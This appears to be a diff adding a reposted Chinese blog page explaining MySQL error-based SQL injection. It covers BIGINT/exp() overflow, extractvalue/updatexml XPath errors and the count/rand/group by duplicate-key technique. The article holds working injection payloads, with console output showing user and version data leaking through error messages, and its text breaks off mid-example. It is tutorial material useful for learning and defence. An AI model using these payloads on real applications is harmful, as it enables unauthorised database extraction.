@@ -1,0 +1,713 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>[转] Mysql注入后利用 | TWO SEE | SEE is the sea of cc</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="mysql,sql,injection">
+    <meta name="description" content="SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息的情况下比较好用，毕竟用盲注的话既耗时又容易被封。 MYSQL报错注入个人认为大体可以分为以下几类：  BIGINT等数据类型溢出 xpath语法错误 concat+rand()+group_by()导致主键重复 一些特性  下面就针对这几种错误类型看看背后的原理是怎">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[转] Mysql注入后利用">
+<meta property="og:url" content="http://www.twosee.cn/2018/01/06/mysql-injection/index.html">
+<meta property="og:site_name" content="TWO SEE">
+<meta property="og:description" content="SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息的情况下比较好用，毕竟用盲注的话既耗时又容易被封。 MYSQL报错注入个人认为大体可以分为以下几类：  BIGINT等数据类型溢出 xpath语法错误 concat+rand()+group_by()导致主键重复 一些特性  下面就针对这几种错误类型看看背后的原理是怎">
+<meta property="article:published_time" content="2018-01-05T17:33:18.000Z">
+<meta property="article:modified_time" content="2021-05-19T09:45:39.118Z">
+<meta property="article:author" content="Twosee">
+<meta property="article:tag" content="mysql">
+<meta property="article:tag" content="sql">
+<meta property="article:tag" content="injection">
+<meta name="twitter:card" content="summary">
+    
+        <link rel="alternate" type="application/atom+xml" title="TWO SEE" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="/css/style.css?v=1.7.2">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="https://avatars2.githubusercontent.com/u/25978241?s=460&v=4">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Twosee</h5>
+          <a href="mailto:twose@qq.com" title="twose@qq.com" class="mail">twose@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                文章
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                标签
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                分类
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/twose" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="http://www.weibo.com/twoseee" target="_blank" >
+                <i class="icon icon-lg icon-weibo"></i>
+                Weibo
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">[转] Mysql注入后利用</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">[转] Mysql注入后利用</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2018-01-05T17:33:18.000Z" itemprop="datePublished" class="page-time">
+  2018-01-06
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-数据溢出"><span class="post-toc-number">1.</span> <span class="post-toc-text">0x01 数据溢出</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-xpath语法错误"><span class="post-toc-number">2.</span> <span class="post-toc-text">0x02 xpath语法错误</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x03-主键重复"><span class="post-toc-number">3.</span> <span class="post-toc-text">0x03 主键重复</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-mysql-injection"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">[转] Mysql注入后利用</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2018-01-06 01:33:18" datetime="2018-01-05T17:33:18.000Z"  itemprop="datePublished">2018-01-06</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息的情况下比较好用，毕竟用盲注的话既耗时又容易被封。</p>
+<p>MYSQL报错注入个人认为大体可以分为以下几类：</p>
+<ol>
+<li>BIGINT等数据类型溢出</li>
+<li>xpath语法错误</li>
+<li>concat+rand()+group_by()导致主键重复</li>
+<li>一些特性</li>
+</ol>
+<p>下面就针对这几种错误类型看看背后的原理是怎样的。</p>
+<span id="more"></span>
+
+<h2 id="0x01-数据溢出"><a href="#0x01-数据溢出" class="headerlink" title="0x01 数据溢出"></a>0x01 数据溢出</h2><p>这里可以看到mysql是怎么处理整形的：<a href="https://dev.mysql.com/doc/refman/5.5/en/integer-types.html" target="_blank" rel="noopener">Integer Types (Exact Value)</a>，如下表：</p>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Storage</th>
+<th>Minimum Value</th>
+<th>Maximum Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td>(Bytes)</td>
+<td>(Signed/Unsigned)</td>
+<td>(Signed/Unsigned)</td>
+</tr>
+<tr>
+<td>TINYINT</td>
+<td>1</td>
+<td>-128</td>
+<td>127</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>0</td>
+<td>255</td>
+</tr>
+<tr>
+<td>SMALLINT</td>
+<td>2</td>
+<td>-32768</td>
+<td>32767</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>0</td>
+<td>65535</td>
+</tr>
+<tr>
+<td>MEDIUMINT</td>
+<td>3</td>
+<td>-8388608</td>
+<td>8388607</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>0</td>
+<td>16777215</td>
+</tr>
+<tr>
+<td>INT</td>
+<td>4</td>
+<td>-2147483648</td>
+<td>2147483647</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>0</td>
+<td>4294967295</td>
+</tr>
+<tr>
+<td>BIGINT</td>
+<td>8</td>
+<td>-9223372036854775808</td>
+<td>9223372036854775807</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>0</td>
+<td>18446744073709551615</td>
+</tr>
+</tbody></table>
+<p>在mysql5.5之前，整形溢出是不会报错的，根据官方文档说明<a href="https://dev.mysql.com/doc/refman/5.5/en/out-of-range-and-overflow.html" target="_blank" rel="noopener">out-of-range-and-overflow</a>，只有版本号大于5.5.5时，才会报错。试着对最大数做加法运算，可以看到报错的具体情况：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 18446744073709551615+1;</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range <span class="keyword">in</span> <span class="string">&#x27;(18446744073709551615 + 1)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>在mysql中，要使用这么大的数，并不需要输入这么长的数字进去，使用按位取反运算运算即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~0;</span><br><span class="line">+----------------------+</span><br><span class="line">| ~0                   |</span><br><span class="line">+----------------------+</span><br><span class="line">| 18446744073709551615 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select ~0+1;</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#x27;(~(0) + 1)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>我们知道，如果一个查询成功返回，则其返回值为0，进行逻辑非运算后可得1，这个值是可以进行数学运算的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select * from (select user())x);</span><br><span class="line">+----------------------------------+</span><br><span class="line">| (select * from (select user())x) |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| root@localhost                   |</span><br><span class="line">+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select !(select * from (select user())x);</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| !(select * from (select user())x) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                 1 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select !(select * from (select user())x)+1;</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| !(select * from (select user())x)+1 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">|                                   2 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>同理，利用exp函数也会产生类似的溢出错误：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exp(709);</span><br><span class="line">+-----------------------+</span><br><span class="line">| exp(709)              |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 8.218407461554972e307 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select exp(710);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#x27;exp(710)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>注入姿势：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exp(~(select*from(select user())x));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#x27;exp(~((select &#x27;root@localhost&#x27; from dual)))&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>利用这一特性，再结合之前说的溢出报错，就可以进行注入了。这里需要说一下，经笔者测试，发现在mysql5.5.47可以在报错中返回查询结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#x27;((not(&#x27;root@localhost&#x27;)) - ~(0))&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>而在mysql&gt;5.5.53时，则不能返回查询结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#x27;((not(`a`.`x`)) - ~(0))&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>此外，报错信息是有长度限制的，在mysql/my_error.c中可以看到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/* Max length of a error message. Should be</span><br><span class="line">kept in sync with MYSQL_ERRMSG_SIZE. */</span><br><span class="line"></span><br><span class="line">#define ERRMSGSIZE (512)</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-xpath语法错误"><a href="#0x02-xpath语法错误" class="headerlink" title="0x02 xpath语法错误"></a>0x02 xpath语法错误</h2><p>从mysql5.1.5开始提供两个<a href="https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html" target="_blank" rel="noopener">XML查询和修改的函数</a>，extractvalue和updatexml。extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select extractvalue(1,&#x27;/a/b&#x27;);</span><br><span class="line">+------------------------+</span><br><span class="line">| extractvalue(1,&#x27;/a/b&#x27;) |</span><br><span class="line">+------------------------+</span><br><span class="line">|                        |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure>
+
+<p>它们的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select updatexml(1,concat(0x7e,(select @@version),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~5.7.17~&#x27;</span><br><span class="line">mysql&gt; select extractvalue(1,concat(0x7e,(select @@version),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~5.7.17~&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-主键重复"><a href="#0x03-主键重复" class="headerlink" title="0x03 主键重复"></a>0x03 主键重复</h2><p>这里利用到了count()和group by在遇到rand()产生的重复值时报错的思路。网上比较常见的payload是这样的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*) from test group by concat(version(),floor(rand(0)*2));</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#x27;5.7.171&#x27; for key &#x27;&lt;group_key&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到错误类型是duplicate entry，即主键重复。实际上只要是count，rand()，group by三个连用就会造成这种报错，与位置无关：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#x27;5.7.171&#x27; for key &#x27;&lt;group_key&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这种报错方法的本质是因为<code>floor(rand(0)*2)</code>的重复性，导致group by语句出错。<code>group by key</code>的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据。举个例子，表中数据如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from test;</span><br><span class="line">+------+-------+</span><br><span class="line">| id   | name  |</span><br><span class="line">+------+-------+</span><br><span class="line">| 0    | jack  |</span><br><span class="line">| 1    | jack  |</span><br><span class="line">| 2    | tom   |</span><br><span class="line">| 3    | candy |</span><br><span class="line">| 4    | tommy |</span><br><span class="line">| 5    | jerry |</span><br><span class="line">+------+-------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>我们以<code>select count(*) from test group by name</code>语句说明大致过程如下：</p>
+<ul>
+<li>先是建立虚拟表，其中key为主键，不可重复：</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<ul>
+<li>开始查询数据，去数据库数据，然后查看虚拟表是否存在，不存在则插入新记录，存在则count(*)字段直接加1：</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>jack</td>
+<td>1</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>jack</td>
+<td>1+1</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>jack</td>
+<td>1+1</td>
+</tr>
+<tr>
+<td>tom</td>
+<td>1</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>jack</td>
+<td>1+1</td>
+</tr>
+<tr>
+<td>tom</td>
+<td>1</td>
+</tr>
+<tr>
+<td>candy</td>
+<td>1</td>
+</tr>
+</tbody></table>
+<p>当这个操作遇到rand(0)*2时，就会发生错误，其原因在于rand(0)是个稳定的序列，我们计算两次rand(0)：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rand(0) from test;</span><br><span class="line">+---------------------+</span><br><span class="line">| rand(0)             |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.15522042769493574 |</span><br><span class="line">|   0.620881741513388 |</span><br><span class="line">|  0.6387474552157777 |</span><br><span class="line">| 0.33109208227236947 |</span><br><span class="line">|  0.7392180764481594 |</span><br><span class="line">|  0.7028141661573334 |</span><br><span class="line">+---------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select rand(0) from test;</span><br><span class="line">+---------------------+</span><br><span class="line">| rand(0)             |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.15522042769493574 |</span><br><span class="line">|   0.620881741513388 |</span><br><span class="line">|  0.6387474552157777 |</span><br><span class="line">| 0.33109208227236947 |</span><br><span class="line">|  0.7392180764481594 |</span><br><span class="line">|  0.7028141661573334 |</span><br><span class="line">+---------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>同理，floor(rand(0)*2)则会固定得到011011…的序列(这个很重要)：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select floor(rand(0)*2) from test;</span><br><span class="line">+------------------+</span><br><span class="line">| floor(rand(0)*2) |</span><br><span class="line">+-----------</span><br></pre></td></tr></table></figure>
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2021-05-19T09:45:39.118Z" itemprop="dateUpdated">2021-05-19 17:45:39</time>
+</span><br>
+
+
+        
+        <a href="/2018/01/06/mysql-injection/" target="_blank" rel="external">http://www.twosee.cn/2018/01/06/mysql-injection/</a>
+        
+    </div>
+    
+    <footer>
+        <a href="http://www.twosee.cn">
+            <img src="https://avatars2.githubusercontent.com/u/25978241?s=460&v=4" alt="Twosee">
+            Twosee
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/injection/" rel="tag">injection</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/mysql/" rel="tag">mysql</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql/" rel="tag">sql</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.twosee.cn/2018/01/06/mysql-injection/&title=《[转] Mysql注入后利用》 — TWO SEE&pic=https://avatars2.githubusercontent.com/u/25978241?s=460&v=4" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.twosee.cn/2018/01/06/mysql-injection/&title=《[转] Mysql注入后利用》 — TWO SEE&source=SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息的情况下比较好用，毕竟..." data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.twosee.cn/2018/01/06/mysql-injection/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《[转] Mysql注入后利用》 — TWO SEE&url=http://www.twosee.cn/2018/01/06/mysql-injection/&via=http://www.twosee.cn" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.twosee.cn/2018/01/06/mysql-injection/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2018/01/28/PHPDoc-type-hinting-for-array-of-objects/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">[译] PHPDoc类型提示数组的对象</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2018/01/06/php-app-security/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">[转] 2018 PHP 应用程序安全设计指北</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+    <!-- Valine Comments -->
+    <div class="comments vcomment" id="comments"></div>
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script>
+    <!-- Valine Comments script -->
+    <script>
+        var GUEST_INFO = ['nick','mail','link'];
+        var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+          return GUEST_INFO.indexOf(item) > -1
+        });
+        new Valine({
+            el: '#comments',
+            notify: 'false' == 'true',
+            verify: 'false' == 'true',
+            appId: "BjOaCSsEoD25PlY0akiSOjLV-gzGzoHsz",
+            appKey: "vz7DaO87fpAiBNIJAJmcqGm0",
+            avatar: "mm",
+            placeholder: "Just go go",
+            guest_info: guest_info.length == 0 ? GUEST_INFO : guest_info,
+            pageSize: "10"
+        })
+    </script>
+    <!-- Valine Comments end -->
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.jpg" data-alipay="/img/alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Twosee &copy; 2003 - 2021</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.twosee.cn/2018/01/06/mysql-injection/&title=《[转] Mysql注入后利用》 — TWO SEE&pic=https://avatars2.githubusercontent.com/u/25978241?s=460&v=4" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.twosee.cn/2018/01/06/mysql-injection/&title=《[转] Mysql注入后利用》 — TWO SEE&source=SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息的情况下比较好用，毕竟..." data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
